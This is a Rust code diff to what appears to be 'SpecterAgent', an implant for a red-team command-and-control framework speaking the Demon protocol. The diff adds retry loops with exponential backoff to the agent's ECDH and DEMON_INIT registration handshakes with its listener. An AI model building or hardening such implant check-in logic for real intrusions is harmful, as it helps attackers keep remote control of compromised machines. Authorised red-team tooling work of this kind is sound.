@@ -1,5 +1,7 @@
 //! Legacy Demon-protocol run-loop and checkin flow.
 
+use std::time::Duration;
+
 use red_cell_common::crypto::{ctr_blocks_for_len, decrypt_agent_data_at_offset};
 use red_cell_common::demon::{DemonCommand, DemonMessage};
 use tracing::{info, warn};
@@ -13,6 +15,12 @@ use super::SpecterAgent;
 use super::working_hours::{
     current_local_time, is_within_working_hours_at, sleep_until_working_hours,
 };
+
+/// Attempts for DEMON_INIT / ECDH registration before giving up (HTTP + optional DoH per try).
+const INIT_HANDSHAKE_MAX_ATTEMPTS: u32 = 5;
+
+/// Initial backoff between registration attempts (exponential, capped).
+const INIT_HANDSHAKE_BACKOFF_START_MS: u64 = 400;
 
 impl SpecterAgent {
     /// Check whether the configured kill date has been reached.
@@ -90,10 +98,62 @@ impl SpecterAgent {
         }
 
         if self.config.listener_pub_key.is_some() {
-            self.ecdh_init_handshake().await?;
-            return self.run_ecdh_loop().await;
+            let mut backoff_ms = INIT_HANDSHAKE_BACKOFF_START_MS;
+            let mut last_err: Option<SpecterError> = None;
+            for attempt in 1..=INIT_HANDSHAKE_MAX_ATTEMPTS {
+                match self.ecdh_init_handshake().await {
+                    Ok(()) => return self.run_ecdh_loop().await,
+                    Err(e) => {
+                        warn!(
+                            agent_id = format_args!("0x{:08X}", self.agent_id),
+                            attempt,
+                            max = INIT_HANDSHAKE_MAX_ATTEMPTS,
+                            error = %e,
+                            "ECDH registration failed"
+                        );
+                        last_err = Some(e);
+                        if attempt < INIT_HANDSHAKE_MAX_ATTEMPTS {
+                            tokio::time::sleep(Duration::from_millis(backoff_ms)).await;
+                            backoff_ms = (backoff_ms * 2).min(8_000);
+                        }
+                    }
+                }
+            }
+            return Err(match last_err {
+                Some(e) => e,
+                None => SpecterError::Transport(
+                    "ECDH registration retries exhausted (no error recorded)".into(),
+                ),
+            });
         }
-        self.init_handshake().await?;
+
+        let mut backoff_ms = INIT_HANDSHAKE_BACKOFF_START_MS;
+        let mut last_err: Option<SpecterError> = None;
+        for attempt in 1..=INIT_HANDSHAKE_MAX_ATTEMPTS {
+            match self.init_handshake().await {
+                Ok(()) => {
+                    last_err = None;
+                    break;
+                }
+                Err(e) => {
+                    warn!(
+                        agent_id = format_args!("0x{:08X}", self.agent_id),
+                        attempt,
+                        max = INIT_HANDSHAKE_MAX_ATTEMPTS,
+                        error = %e,
+                        "DEMON_INIT handshake failed"
+                    );
+                    last_err = Some(e);
+                    if attempt < INIT_HANDSHAKE_MAX_ATTEMPTS {
+                        tokio::time::sleep(Duration::from_millis(backoff_ms)).await;
+                        backoff_ms = (backoff_ms * 2).min(8_000);
+                    }
+                }
+            }
+        }
+        if let Some(e) = last_err {
+            return Err(e);
+        }
 
         loop {
             // ── Kill-date check ─────────────────────────────────────────
